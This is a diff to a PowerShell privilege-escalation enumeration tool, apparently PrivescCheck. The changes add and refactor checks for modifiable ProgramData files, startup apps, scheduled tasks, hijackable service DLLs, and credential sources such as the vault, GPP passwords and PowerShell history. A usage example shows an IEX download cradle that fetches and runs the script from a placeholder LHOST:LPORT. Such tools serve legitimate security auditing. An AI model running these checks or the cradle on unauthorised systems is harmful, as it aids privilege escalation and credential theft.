+        $Item | Add-Member -MemberType "NoteProperty" -Name "Path" -Value $HistoryFilePath
+        $Item | Add-Member -MemberType "NoteProperty" -Name "CreationTime" -Value $FileItem.CreationTime
+        $Item | Add-Member -MemberType "NoteProperty" -Name "LastWriteTime" -Value $FileItem.LastWriteTime
+        $Item | Add-Member -MemberType "NoteProperty" -Name "Lines" -Value $HistoryCount
+        $Item | Add-Member -MemberType "NoteProperty" -Name "Matches" -Value $AllMatchesCount
+        $Item
+    }
+}
 # ----------------------------------------------------------------
 # END CREDENTIALS     
 # ----------------------------------------------------------------
@@ -4660,7 +5260,6 @@ function Invoke-ModifiableProgramsCheck {
         [void]$SearchPath.Add([string]$(Join-Path -Path $Item.FullName -ChildPath "\*\*")) # Do this to avoid the use of -Depth which is PSH5+
         
         $ChildItems = Get-ChildItem -Path $SearchPath -ErrorAction SilentlyContinue -ErrorVariable GetChildItemError 
-        #$ChildItems = $Item | Get-ChildItem -Recurse -Depth 2 -ErrorAction SilentlyContinue -ErrorVariable GetChildItemError 
         
         if (-not $GetChildItemError) {
 
@@ -4683,6 +5282,63 @@ function Invoke-ModifiableProgramsCheck {
                         }
                     }
                 }
+            }
+        }
+    }
+}
+
+function Invoke-ProgramDataCheck {
+    <#
+    .SYNOPSIS
+    
+    Checks for modifiable files and folders under non default ProgramData folders.
+
+    Author: @itm4n
+    License: BSD 3-Clause
+    
+    .DESCRIPTION
+
+    This script first lists all the subfolders under 'C:\ProgramData\'. For each folder that
+    is not a "known" default Windows folder, it lists all the files and folders it contains. If a 
+    modifiable file or folder is found, it is reported by the script.
+    
+    .EXAMPLE
+
+    PS C:\> Invoke-ProgramDataCheck
+
+    ModifiablePath    : C:\ProgramData\chocolatey\logs
+    IdentityReference : BUILTIN\Users
+    Permissions       : {WriteAttributes, Synchronize, AppendData/AddSubdirectory, WriteExtendedAttributes...}
+
+    ModifiablePath    : C:\ProgramData\chocolatey\logs\choco.summary.log
+    IdentityReference : BUILTIN\Users
+    Permissions       : {WriteAttributes, Synchronize, AppendData/AddSubdirectory, WriteExtendedAttributes...}
+
+    ModifiablePath    : C:\ProgramData\chocolatey\logs\chocolatey.log
+    IdentityReference : BUILTIN\Users
+    Permissions       : {WriteAttributes, Synchronize, AppendData/AddSubdirectory, WriteExtendedAttributes...}
+
+    ModifiablePath    : C:\ProgramData\shimgen\generatedfiles
+    IdentityReference : BUILTIN\Users
+    Permissions       : {WriteAttributes, AppendData/AddSubdirectory, WriteExtendedAttributes, WriteData/AddFile}
+
+    ModifiablePath    : C:\ProgramData\VMware\logs
+    IdentityReference : BUILTIN\Users
+    Permissions       : {WriteAttributes, AppendData/AddSubdirectory, WriteExtendedAttributes, WriteData/AddFile}
+    
+    #>
+
+    [CmdletBinding()] param()
+
+    $IgnoredProgramData = @("Microsoft", "Microsoft OneDrive", "Package Cache", "Packages", "SoftwareDistribution", "ssh", "USOPrivate", "USOShared", "")
+
+    Get-ChildItem -Path $env:ProgramData | ForEach-Object {
+    
+        if ($_ -is [System.IO.DirectoryInfo] -and (-not ($IgnoredProgramData -contains $_.Name))) {
+    
+            $_ | Get-ChildItem -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {
+                        
+                $_ | Get-ModifiablePath -LiteralPaths | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '')} 
             }
         }
     }
@@ -4735,27 +5391,32 @@ function Invoke-ApplicationsOnStartupCheck {
 
                 $RegKeyValueName = $_
                 $RegKeyValueData = $Item.GetValue($RegKeyValueName, "", "DoNotExpandEnvironmentNames")
-                
-                $ModifiablePaths = $RegKeyValueData | Get-ModifiablePath | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '')}
-                if (([object[]]$ModifiablePaths).Length -gt 0) {
-                    $IsModifiable = $True 
-                } else {
-                    $IsModifiable = $False 
-                }
 
-                $ResultItem = New-Object -TypeName PSObject 
-                $ResultItem | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $RegKeyValueName
-                $ResultItem | Add-Member -MemberType "NoteProperty" -Name "Path" -Value "$($RegKeyPath)\$($RegKeyValueName)"
-                $ResultItem | Add-Member -MemberType "NoteProperty" -Name "Data" -Value $RegKeyValueData
-                $ResultItem | Add-Member -MemberType "NoteProperty" -Name "IsModifiable" -Value $IsModifiable
-                $ResultItem 
+                if ($RegKeyValueData -and ($RegKeyValueData -ne '')) {
+
+                    $ModifiablePaths = $RegKeyValueData | Get-ModifiablePath | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '')}
+                    if (([object[]]$ModifiablePaths).Length -gt 0) {
+                        $IsModifiable = $True 
+                    } else {
+                        $IsModifiable = $False 
+                    }
+    
+                    $ResultItem = New-Object -TypeName PSObject 
+                    $ResultItem | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $RegKeyValueName
+                    $ResultItem | Add-Member -MemberType "NoteProperty" -Name "Path" -Value "$($RegKeyPath)\$($RegKeyValueName)"
+                    $ResultItem | Add-Member -MemberType "NoteProperty" -Name "Data" -Value $RegKeyValueData
+                    $ResultItem | Add-Member -MemberType "NoteProperty" -Name "IsModifiable" -Value $IsModifiable
+                    $ResultItem 
+                }
             }
         }
     }
 
     $Root = (Get-Item -Path $env:windir).PSDrive.Root
     
-    [string[]]$FileSystemPaths = "\Users\All Users\Start Menu\Programs\Startup", "\Users\$env:USERNAME\Start Menu\Programs\Startup"
+    # We want to check only startup applications that affect all users
+    # [string[]]$FileSystemPaths = "\Users\All Users\Start Menu\Programs\Startup", "\Users\$env:USERNAME\Start Menu\Programs\Startup"
+    [string[]]$FileSystemPaths = "\Users\All Users\Start Menu\Programs\Startup"
 
     $FileSystemPaths | ForEach-Object {
 
@@ -4794,6 +5455,31 @@ function Invoke-ApplicationsOnStartupCheck {
     }
 }
 
+function Invoke-ApplicationsOnStartupVulnCheck {
+    <#
+    .SYNOPSIS
+
+    Enumerates startup applications that can be modified by the current user
+
+    Author: @itm4n
+    License: BSD 3-Clause
+    
+    .DESCRIPTION
+
+    Some applications can be set as "startup" applications for all users. If a user can modify one
+    of these apps, they would potentially be able to run arbitrary code in the context of other 
+    users. Therefore, low-privileged users should not be able to modify the files used by such
+    application.
+    
+    .EXAMPLE
+
+    An example
+    
+    #>
+
+    Invoke-ApplicationsOnStartupCheck | Where-Object { $_.IsModifiable }
+}
+
 function Invoke-ScheduledTasksCheck {
     <#
     .SYNOPSIS
@@ -4807,7 +5493,7 @@ function Invoke-ScheduledTasksCheck {
 
     This function enumerates all the scheduled tasks which are visible by the current user. For 
     each task, it extracts the command line and checks whether it contains a path pointing to a 
-    modifiable file.
+    modifiable file. If a task is run as the current user, it is filtered out. 
     
     .EXAMPLE
 
@@ -4839,16 +5525,6 @@ function Invoke-ScheduledTasksCheck {
         }
     }
 
-    function Convert-SidToName {
-
-        param (
-            [string]$Sid
-        )
-
-        $SidObj = New-Object System.Security.Principal.SecurityIdentifier($Sid)
-        $SidObj.Translate( [System.Security.Principal.NTAccount]) | Select-Object -ExpandProperty Value
-    }
-
     try {
 
         $ScheduleService = New-Object -ComObject("Schedule.Service")
@@ -4866,9 +5542,15 @@ function Invoke-ScheduledTasksCheck {
                 $TaskExec = $TaskXml.GetElementsByTagName("Exec")
                 $TaskCommandLine = "$($TaskExec.Command) $($TaskExec.Arguments)"
                 $Principal = $TaskXml.GetElementsByTagName("Principal")
+                
+                $CurrentUserIsOwner = $False
 
                 if ($Principal.UserId) {
                     $PrincipalName = Convert-SidToName -Sid $Principal.UserId
+                    
+                    if ($(Invoke-UserCheck).SID -eq $Principal.UserId) {
+                        $CurrentUserIsOwner = $True
+                    }
                 } elseif ($Principal.GroupId) {
                     $PrincipalName = Convert-SidToName -Sid $Principal.GroupId
                 }
@@ -4877,17 +5559,21 @@ function Invoke-ScheduledTasksCheck {
 
                     if ($Filtered) {
 
-                        $TaskCommandLine | Get-ModifiablePath | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '')} | ForEach-Object {
+                        # Filter out tasks that are run as the current user
+                        if (-not $CurrentUserIsOwner) {
+                            $TaskCommandLine | Get-ModifiablePath | Where-Object {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '')} | ForEach-Object {
 
-                            $ResultItem = New-Object -TypeName PSObject 
-                            $ResultItem | Add-Member -MemberType "NoteProperty" -Name "TaskName" -Value $TaskName
-                            $ResultItem | Add-Member -MemberType "NoteProperty" -Name "TaskPath" -Value $TaskPath
-                            $ResultItem | Add-Member -MemberType "NoteProperty" -Name "TaskFile" -Value $TaskFile
-                            $ResultItem | Add-Member -MemberType "NoteProperty" -Name "RunAs" -Value $PrincipalName
-                            $ResultItem | Add-Member -MemberType "NoteProperty" -Name "Command" -Value $TaskCommandLine
-                            $ResultItem | Add-Member -MemberType "NoteProperty" -Name "ModifiablePath" -Value $_.ModifiablePath
-                            $ResultItem
+                                $ResultItem = New-Object -TypeName PSObject 
+                                $ResultItem | Add-Member -MemberType "NoteProperty" -Name "TaskName" -Value $TaskName
+                                $ResultItem | Add-Member -MemberType "NoteProperty" -Name "TaskPath" -Value $TaskPath
+                                $ResultItem | Add-Member -MemberType "NoteProperty" -Name "TaskFile" -Value $TaskFile
+                                $ResultItem | Add-Member -MemberType "NoteProperty" -Name "RunAs" -Value $PrincipalName
+                                $ResultItem | Add-Member -MemberType "NoteProperty" -Name "Command" -Value $TaskCommandLine
+                                $ResultItem | Add-Member -MemberType "NoteProperty" -Name "ModifiablePath" -Value $_.ModifiablePath
+                                $ResultItem
+                            }
                         }
+
                     } else {
 
                         $ResultItem = New-Object -TypeName PSObject 
@@ -5027,7 +5713,6 @@ function Invoke-RunningProcessCheck {
 # ----------------------------------------------------------------
 # END INSTALLED PROGRAMS   
 # ----------------------------------------------------------------
-
 
 # ----------------------------------------------------------------
 # BEGIN SERVICES   
@@ -5247,6 +5932,7 @@ function Invoke-InstalledServicesCheck {
 
     # Get only third-party services 
     $FilteredServices = Get-ServiceList -FilterLevel 3
+    Write-Verbose "Enumerating $($FilteredServices.Count) services..."
 
     ForEach ($Service in $FilteredServices) {
         # Make a simplified version of the Service object, we only basic information for ths check.
@@ -5299,6 +5985,7 @@ function Invoke-ServicesPermissionsRegistryCheck {
     
     # Get all services except the ones with an empty ImagePath or Drivers 
     $AllServices = Get-ServiceList -FilterLevel 2 
+    Write-Verbose "Enumerating $($AllServices.Count) services..."
 
     ForEach ($Service in $AllServices) {
 
@@ -5364,8 +6051,9 @@ function Invoke-ServicesUnquotedPathCheck {
     
     [CmdletBinding()] param()
 
-    # Get all services which have a non-empty ImagePath
-    $Services = Get-ServiceList -FilterLevel 1
+    # Get all services which have a non-empty ImagePath (exclude drivers as well)
+    $Services = Get-ServiceList -FilterLevel 2
+    Write-Verbose "Enumerating $($Services.Count) services..."
     
     $PermissionsAddFile = @("WriteData/AddFile", "DeleteChild", "WriteDAC", "WriteOwner")
     $PermissionsAddFolder = @("AppendData/AddSubdirectory", "DeleteChild", "WriteDAC", "WriteOwner")
@@ -5479,6 +6167,7 @@ function Invoke-ServicesImagePermissionsCheck {
     [CmdletBinding()] param()
     
     $Services = Get-ServiceList -FilterLevel 1
+    Write-Verbose "Enumerating $($Services.Count) services..."
 
     ForEach ($Service in $Services) {
 
@@ -5534,6 +6223,7 @@ function Invoke-ServicesPermissionsCheck {
     # The properties of a custom Service object are: Name, DisplayName, User, ImagePath, StartMode, Type, RegsitryKey, RegistryPath 
     # We also apply the FilterLevel 1 to filter out services which have an empty ImagePath 
     $Services = Get-ServiceList -FilterLevel 1
+    Write-Verbose "Enumerating $($Services.Count) services..."
 
     # For each custom Service object in the list 
     ForEach ($Service in $Services) {
@@ -5675,107 +6365,72 @@ function Invoke-HijackableDllsCheck {
         return $False
     }
 
+    function Test-HijackableDll {
+
+        [CmdletBinding()] param (
+            [string]$ServiceName,
+            [string]$DllName,
+            [string]$Description,
+            [boolean]$RebootRequired = $True
+        )
+
+        $Service = Get-ServiceFromRegistry -Name $ServiceName 
+        if ($Service -and ($Service.StartMode -ne "Disabled")) {
+
+            if (-not (Test-DllExists -Name $DllName)) {
+
+                $HijackableDllItem = New-Object -TypeName PSObject
+                $HijackableDllItem | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $DllName
+                $HijackableDllItem | Add-Member -MemberType "NoteProperty" -Name "Description" -Value $Description
+                $HijackableDllItem | Add-Member -MemberType "NoteProperty" -Name "RunAs" -Value $Service.User
+                $HijackableDllItem | Add-Member -MemberType "NoteProperty" -Name "RebootRequired" -Value $RebootRequired 
+                $HijackableDllItem
+            }
+        }
+    }
+
     $OsVersion = [System.Environment]::OSVersion.Version
 
     if ($OsVersion.Major -eq 10) {
-        #$Service = Get-Service -Name "CDPSvc" -ErrorAction SilentlyContinue -ErrorVariable ErrorGetService
-        $Service = Get-ServiceFromRegistry -Name "CDPSvc"
-        if ($Service -and ($Service.StartMode -ne "Disabled")) {
-            $DllName = "cdpsgshims.dll"
-            if (-not (Test-DllExists -Name $DllName)) {
-                $ServiceItem = New-Object -TypeName PSObject
-                $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $DllName
-                $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Description" -Value "Loaded by CDPSvc upon service startup"
-                $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "RunAs" -Value "NT AUTHORITY\LOCAL SERVICE"
-                $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "RebootRequired" -Value $True 
-                $ServiceItem
-            }
-        }
+
+        Test-HijackableDll -ServiceName "CDPSvc" -DllName "cdpsgshims.dll" -Description "Loaded by CDPSvc upon service startup"
+        Test-HijackableDll -ServiceName "Schedule" -DllName "WptsExtensions.dll" -Description "Loaded by the Task Scheduler upon service startup"
+
     }
 
     # Windows 7, 8, 8.1
     if (($OsVersion.Major -eq 6) -and ($OsVersion.Minor -ge 1) -and ($OsVersion.Minor -le 3)) {
-        #$Service = Get-Service -Name "DiagTrack" -ErrorAction SilentlyContinue -ErrorVariable ErrorGetService
-        $Service = Get-ServiceFromRegistry -Name "DiagTrack"
-        if ($Service -and ($Service.StartMode -ne "Disabled")) {
-            $DllName = "windowsperformancerecordercontrol.dll"
-            if (-not (Test-DllExists -Name $DllName)) {
-                $ServiceItem = New-Object -TypeName PSObject
-                $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $DllName
-                $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Description" -Value "Loaded by DiagTrack upon service startup or shutdown"
-                $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "RunAs" -Value "NT AUTHORITY\SYSTEM"
-                $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "RebootRequired" -Value $True 
-                $ServiceItem
-            }
 
-            $DllName = "diagtrack_win.dll"
-            if (-not (Test-DllExists -Name $DllName)) {
-                $ServiceItem = New-Object -TypeName PSObject
-                $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $DllName
-                $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Description" -Value "Loaded by DiagTrack upon service startup"
-                $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "RunAs" -Value "NT AUTHORITY\SYSTEM"
-                $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "RebootRequired" -Value $True 
-                $ServiceItem
-            }
-        }
+        Test-HijackableDll -ServiceName "DiagTrack" -DllName "windowsperformancerecordercontrol.dll" -Description "Loaded by DiagTrack upon service startup or shutdown"
+        Test-HijackableDll -ServiceName "DiagTrack" -DllName "diagtrack_win.dll" -Description "Loaded by DiagTrack upon service startup"
+
     }
 
     # Windows Vista, 7, 8
     if (($OsVersion.Major -eq 6) -and ($OsVersion.Minor -ge 0) -and ($OsVersion.Minor -le 2)) {
-        #$Service = Get-Service -Name "IKEEXT" -ErrorAction SilentlyContinue -ErrorVariable ErrorGetService
-        $Service = Get-ServiceFromRegistry -Name "IKEEXT"
-        if ($Service -and ($Service.StartMode -ne "Disabled")) {
 
-            $RebootRequired = $True
-            $Service = Get-Service -Name "IKEEXT" -ErrorAction SilentlyContinue -ErrorVariable ErrorGetService
-            if ((-not $ErrorGetService) -and ($Service.Status -eq "Stopped")) {
-                $RebootRequired = $False
-            }
-
-            $DllName = "wlbsctrl.dll"
-            if (-not (Test-DllExists -Name $DllName)) {
-                $ServiceItem = New-Object -TypeName PSObject
-                $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $DllName
-                $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Description" -Value "Loaded by IKEEXT upon service startup"
-                $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "RunAs" -Value "NT AUTHORITY\SYSTEM"
-                $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "RebootRequired" -Value $RebootRequired 
-                $ServiceItem
-            }
+        $RebootRequired = $True
+        $Service = Get-Service -Name "IKEEXT" -ErrorAction SilentlyContinue -ErrorVariable ErrorGetService
+        if ((-not $ErrorGetService) -and ($Service.Status -eq "Stopped")) {
+            $RebootRequired = $False
         }
+
+        Test-HijackableDll -ServiceName "IKEEXT" -DllName "wlbsctrl.dll" -Description "Loaded by IKEEXT upon service startup" -RebootRequired $RebootRequired
+
     }
 
     # Windows 7
     if (($OsVersion.Major -eq 6) -and ($OsVersion.Minor -eq 1)) {
-        #$Service = Get-Service -Name "NetMan" -ErrorAction SilentlyContinue -ErrorVariable ErrorGetService
-        $Service = Get-ServiceFromRegistry -Name "NetMan"
-        if ($Service -and ($Service.StartMode -ne "Disabled")) {
-            $DllName = "wlanhlp.dll"
-            if (-not (Test-DllExists -Name $DllName)) {
-                $ServiceItem = New-Object -TypeName PSObject
-                $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $DllName
-                $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Description" -Value "Loaded by NetMan when listing network interfaces"
-                $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "RunAs" -Value "NT AUTHORITY\SYSTEM"
-                $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "RebootRequired" -Value $False 
-                $ServiceItem
-            } 
-        }
+
+        Test-HijackableDll -ServiceName "NetMan" -DllName "wlanhlp.dll" -Description "Loaded by NetMan when listing network interfaces" -RebootRequired $False
+
     }
 
     # Windows 8, 8.1, 10
     if (($OsVersion.Major -eq 10) -or (($OsVersion.Major -eq 6) -and ($OsVersion.Minor -ge 2) -and ($OsVersion.Minor -le 3))) {
-        # $Service = Get-Service -Name "NetMan" -ErrorAction SilentlyContinue -ErrorVariable ErrorGetService
-        $Service = Get-ServiceFromRegistry -Name "NetMan"
-        if ($Service -and ($Service.StartMode -ne "Disabled")) {
-            $DllName = "wlanapi.dll"
-            if (-not (Test-DllExists -Name $DllName)) {
-                $ServiceItem = New-Object -TypeName PSObject
-                $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Name" -Value $DllName
-                $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "Description" -Value "Loaded by NetMan when listing network interfaces"
-                $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "RunAs" -Value "NT AUTHORITY\SYSTEM"
-                $ServiceItem | Add-Member -MemberType "NoteProperty" -Name "RebootRequired" -Value $False 
-                $ServiceItem
-            }
-        }
+
+        Test-HijackableDll -ServiceName "NetMan" -DllName "wlanapi.dll" -Description "Loaded by NetMan when listing network interfaces" -RebootRequired $False
+        
     }
 }
 # ----------------------------------------------------------------
@@ -5787,52 +6442,13 @@ function Invoke-HijackableDllsCheck {
 # Main  
 # ----------------------------------------------------------------
 #region Main
-function Write-Banner {
-    [CmdletBinding()] param(
-        [string]$Category,
-        [string]$Name,
-        [ValidateSet("Info", "Conf", "Vuln")]$Type,
-        [string]$Note
-    )
-
-    function Split-Note {
-        param([string]$Note)
-        $NoteSplit = New-Object System.Collections.ArrayList
-        $Temp = $Note 
-        do {
-            if ($Temp.Length -gt 53) {
-                [void]$NoteSplit.Add([string]$Temp.Substring(0, 53))
-                $Temp = $Temp.Substring(53)
-            } else {
-                [void]$NoteSplit.Add([string]$Temp)
-                break
-            }
-        } while ($Temp.Length -gt 0)
-        $NoteSplit
-    }
-
-    $Title = "$($Category.ToUpper()) > $($Name)"
-    if ($Title.Length -gt 46) {
-        throw "Input title is too long."
-    }
-
-    $Result = ""
-    $Result += "+------+------------------------------------------------+------+`r`n"
-    $Result += "| TEST | $Title$(' '*(46 - $Title.Length)) | $($Type.ToUpper()) |`r`n"
-    $Result += "+------+------------------------------------------------+------+`r`n"
-    Split-Note -Note $Note | ForEach-Object {
-        $Result += "| $(if ($Flag) { '    ' } else { 'DESC'; $Flag = $True }) | $($_)$(' '*(53 - ([string]$_).Length)) |`r`n"
-    }
-    $Result += "+------+-------------------------------------------------------+"
-    $Result
-}
 
 function Invoke-PrivescCheck {
     <#
     .SYNOPSIS
 
-    Enumerates common security misconfigurations that can be exploited of privilege escalation
-    pourposes. 
+    Enumerates common security misconfigurations that can be exploited for privilege escalation
+    purposes.
 
     Author: @itm4n
     License: BSD 3-Clause
@@ -5844,473 +6460,611 @@ function Invoke-PrivescCheck {
     choose between several potential exploits. For example, if you find that a service is 
     vulnerable to DLL hijacking but you can't restart it manually, you will find useful to know
     hos often the machine is rebooted (in the case of a server). If you see that it is rebooted 
-    every night for instance, you may want to attempt an exploit. 
+    every night for instance, you may want to attempt an exploit.
+
+    .PARAMETER Extended
+
+    Set this flag to enable extended checks.
+
+    .PARAMETER Force
+
+    Ignore warnings.
+
+    .PARAMETER Silent
+
+    Don't output test results, show only the final vulnerability report.
+
+    .PARAMETER Report
+
+    Basename (or path + basename) of the output file report.
+
+    .PARAMETER Format
+
+    Select the format of the output file (e.g.: TXT, HTML or CSV).
     
     .EXAMPLE
 
-    PS C:\Temp\> . .\Invoke-PrivescCheck.ps1; Invoke-PrivescCheck 
+    PS C:\Temp\> . .\PrivescCheck.ps1; Invoke-PrivescCheck 
 
     .EXAMPLE 
 
-    C:\Temp\>powershell -ep bypass -c ". .\Invoke-PrivescCheck.ps1; Invoke-PrivescCheck"
+    C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
 
     .EXAMPLE
 
-    C:\Temp\>powershell "IEX (New-Object Net.WebClient).DownloadString('http://LHOST:LPORT/Invoke-P
+    C:\Temp\>powershell "IEX (New-Object Net.WebClient).DownloadString('http://LHOST:LPORT/P
     rivescCheck.ps1'; Invoke-PrivescCheck" 
 
     #>
 
-    [CmdletBinding()] param()
+    [CmdletBinding()] param(
+        [switch]$Extended = $False,
+        [switch]$Force = $False,
+        [switch]$Silent = $False,
+        #[string]$OutFile,
+        #[ValidateSet("HTML", "CSV")][string]$OutFormat
+        [string]$Report,
+        [ValidateSet("TXT", "HTML", "CSV")][string[]]$Format
+    )
 
-    ### This check was taken from PowerUp.ps1
-    # https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
+    # Check wether the current process has admin privileges. 
+    # The following check was taken from Pow*rUp.ps1
     $IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
+    if($IsAdmin) {
 
-    if($IsAdmin){
-        "[+] Current user already has local administrative privileges! Safely exiting."
+        if (-not $Force) {
 
-        # We don't want to continue, otherwise the script will identify almost everything as 
-        # exploitable and thus generate a loooot of output. 
-        return
+            Write-Warning "You are running this script as an administrator! Some checks will be automatically disabled."
+            Write-Warning "You can specify the '-Force' option to disable this warning message."
+            Start-Sleep -Seconds 10
+        }
     }
 
-    Write-Banner -Category "user" -Name "whoami" -Type Info -Note "What's my username / SID?"
-    $Results = Invoke-UserCheck
-    if ($Results) {
-        "[*] Found some info:"
-        $Results | Format-Table -AutoSize
-    } else {
-        "[!] Nothing found."
+    # The following CSV data contains all the checks
+    $AllChecksCsv = @"
+"Id", "File", "Command", "Params", "Category", "DisplayName", "Type", "Severity", "Description", "Format", "Extended", "RunIfAdmin"
+"USER_USER", "", "Invoke-UserCheck", "", "User", "whoami", "Info", "Info", "Get the full name of the current user (domain + username) along with the associated Security Identifier (SID).", "Table", True, True
+"USER_GROUPS", "", "Invoke-UserGroupsCheck", "", "User", "whoami /groups", "Info", "Info", "List the groups the current user belongs to. Default groups are filtered out to minimize the output.", "Table", True, True
+"USER_PRIVILEGES", "", "Invoke-UserPrivilegesCheck", "", "User", "Privileges", "Vuln", "High", "List the privileges that are associated to the current user's token. If any of them can be leveraged to somehow run code in the context of the SYSTEM account, it will be reported as a finding.", "Table", False, False
+"USER_ENV", "", "Invoke-UserEnvCheck", "", "User", "Environment Variables", "Info", "Info", "List the environment variables of the current process and try to identify any potentially sensitive information such as passwords or API secrets. This check is simply based on keyword matching and might not be entirely reliable.", "Table", False, True
+"SERVICE_INSTALLED", "", "Invoke-InstalledServicesCheck", "", "Services", "Non-default Services", "Info", "Info", "List all registered services and filter out the ones that are built into Windows. It does so by parsing the target executable's metadata.", "List", False, True
+"SERVICE_PERMISSIONS", "", "Invoke-ServicesPermissionsCheck", "", "Services", "Permissions - SCM", "Vuln", "High", "Interact with the Service Control Manager (SCM) and check whether the current user can modify any registered service.", "List", False, False
+"SERVICE_PERMISSIONS_REGISTRY", "", "Invoke-ServicesPermissionsRegistryCheck", "", "Services", "Permissions - Registry", "Vuln", "High", "Parse the registry and check whether the current user can modify the configuration of any registered service.", "List", False, False
+"SERVICE_IMAGE_PERMISSIONS", "", "Invoke-ServicesImagePermissionsCheck", "", "Services", "Binary Permissions", "Vuln", "High", "List all services and check whether the current user can modify the target executable or write files in its parent folder.", "List", False, False
+"SERVICE_UNQUOTED_PATH", "", "Invoke-ServicesUnquotedPathCheck", "", "Services", "Unquoted Paths", "Vuln", "Medium", "List registered services and check whether any of them is configured with an unquoted path that can be exploited.", "List", False, False
+"SERVICE_DLL_HIJACKING", "", "Invoke-DllHijackingCheck", "", "Services", "System's %PATH%", "Vuln", "High", "Retrieve the list of SYSTEM %PATH% folders and check whether the current user has some write permissions in any of them.", "List", False, False
+"SERVICE_HIJACKABLE_DLL", "", "Invoke-HijackableDllsCheck", "", "Services", "Hijackable DLLs", "Info", "Info", "List Windows services that are prone to Ghost DLL hijacking. This is particularly relevant if the current user can create files in one of the SYSTEM %PATH% folders.", "List", False, False
+"APP_INSTALLED", "", "Invoke-InstalledProgramsCheck", "", "Apps", "Non-default Apps", "Info", "Info", "Enumerate non-default and third-party applications by parsing the registry.", "Table", True, True
+"APP_MODIFIABLE", "", "Invoke-ModifiableProgramsCheck", "", "Apps", "Modifiable Apps", "Vuln", "Medium", "List non-default and third-party applications and report the ones that can be modified by the current user.", "List", False, False
+"APP_PROGRAMDATA", "", "Invoke-ProgramDataCheck", "", "Apps", "ProgramData folders/files", "Info", "Info", "List the non-default ProgramData folders and check whether the current user has write permissions. This check is purely informative and the results require manual analysis.", "List", True, False
+"APP_STARTUP", "", "Invoke-ApplicationsOnStartupCheck", "", "Apps", "Apps Run on Startup", "Info", "Info", "Enumerate the system-wide applications that are run on start-up.", "List", True, True
+"APP_STARTUP_VULN", "", "Invoke-ApplicationsOnStartupVulnCheck", "", "Apps", "Modifiable Apps Run on Startup", "Vuln", "Medium", "Enumerate the system-wide applications that are run on start-up and check whether they can be modified by the current user.", "List", False, False
+"APP_SCHTASKS", "", "Invoke-ScheduledTasksCheck", "-Filtered", "Apps", "Scheduled Tasks", "Vuln", "Medium", "Enumerate the scheduled tasks and checks whether they can be modified by the current user. Note that, as a low-privileged user, it's not possible to enumerate all the scheduled tasks.", "List", True, False
+"APP_PROCESSES", "", "Invoke-RunningProcessCheck", "", "Apps", "Running Processes", "Info", "Info", "List processes that are not owned by the current user and filter out common processes such as 'svchost.exe'.", "Table", True, True
+"CREDS_SAM_BKP", "", "Invoke-SamBackupFilesCheck", "", "Creds", "SAM/SYSTEM Backup Files", "Vuln", "Medium", Check whether some backup files of the SAM/SYSTEM hives were created with insecure permissions.", "List", False, False
+"CREDS_UNATTENDED", "", "Invoke-UnattendFilesCheck", "", "Creds", "Unattended Files", "Vuln", "Medium", "Locate 'Unattend' files and check whether they contain any clear-text credentials.", "List", False, True
+"CREDS_WINLOGON", "", "Invoke-WinlogonCheck", "", "Creds", "WinLogon", "Vuln", "Medium", "Parse the Winlogon registry keys and check whether they contain any clear-text password. Entries that have an empty password field are filtered out.", "List", False, True
+"CREDS_CRED_FILES", "", "Invoke-CredentialFilesCheck", "", "Creds", "Credential Files", "Info", "Info", "Enumerate the credential files that are present in the current user's HOME folder. This is purely informative.", "List", True, True
+"CREDS_VAULT_CRED", "", "Invoke-VaultCredCheck", "", "Creds", "Credential Manager", "Info", "Info", "Enumerate the credentials that are saved in the current user's vault.", "List", False, True
+"CREDS_VAULT_LIST", "", "Invoke-VaultListCheck", "", "Creds", "Credential Manager (web)", "Info", "Info", "Enumerate the web credentials that are saved in the current user's Vault.", "List", False, True
+"CREDS_GPP", "", "Invoke-GPPPasswordCheck", "", "Creds", "GPP Passwords", "Vuln", "Medium", "Locate old cached Group Policy Preference files that contain a 'cpassword' field and extract the clear-text credentials.", "List", False, True
+"CREDS_PS_HIST", "", "Invoke-PowerShellHistoryCheck", "", "Creds", "PowerShell History", "Info", "Info", "Locate the current user's PowerShell history file and check whether it contains some clear-text credentials. This check is simply based on keyword matching and might not be entirely reliable.", "List", True, True
+"HARDEN_UAC", "", "Invoke-UacCheck", "", "Hardening", "UAC Settings", "Info", "Info", "Retrieve the User Access Control (UAC) configuration and check whether it is enabled.", "List", True, True
